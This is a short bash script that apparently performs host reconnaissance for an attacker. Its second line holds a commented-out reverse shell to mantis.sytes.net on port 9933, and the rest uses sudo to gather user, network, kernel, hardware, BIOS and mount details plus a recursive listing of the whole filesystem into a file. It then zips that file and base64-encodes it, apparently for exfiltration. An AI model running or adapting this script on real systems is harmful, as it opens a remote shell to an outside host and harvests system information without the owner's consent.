#!/bin/bash
#bash -i >& /dev/tcp/mantis.sytes.net/9933 0>&1 &disown

whoami > info.txt
sudo whoami >> info.txt
echo >> info.txt
sudo ifconfig >>info.txt
echo >> info.txt
sudo cat /proc/version >> info.txt
echo >> info.txt
sudo cat /proc/cpuinfo >> info.txt
echo >> info.txt
sudo cat /proc/meminfo >>info.txt
echo >> info.txt
sudo cat /proc/scsi/scsi >>info.txt
echo >> info.txt
sudo cat /proc/partitions >>info.txt
echo >> info.txt
uname -a >> info.txt
echo >> info.txt
sudo lscpu >> info.txt
echo >> info.txt
sudo lshw >> info.txt
echo >> info.txt
sudo hwinfo >> info.txt
echo >> info.txt
sudo lspci -v >>info.txt
echo >> info.txt
sudo lsscsi >>info.txt
echo >> info.txt
sudo lsusb >>info.txt
echo >> info.txt
sudo lsblk >>info.txt
echo >> info.txt
sudo df -H >>info.txt
echo >> info.txt
java -version >>info.txt
echo >> info.txt
ruby -v >>info.txt
echo >> info.txt
python --version >>info.txt
echo >> info.txt
sudo mount >>info.txt
echo >> info.txt
free -m >>info.txt
echo >> info.txt
sudo dmidecode -t processor >>info.txt
echo >> info.txt
sudo dmidecode -t memory >>info.txt
echo >> info.txt
sudo dmidecode -t bios >>info.txt
sudo ls -R / >> info.txt
zip -9 info.zip info.txt
base64 -i info.zip
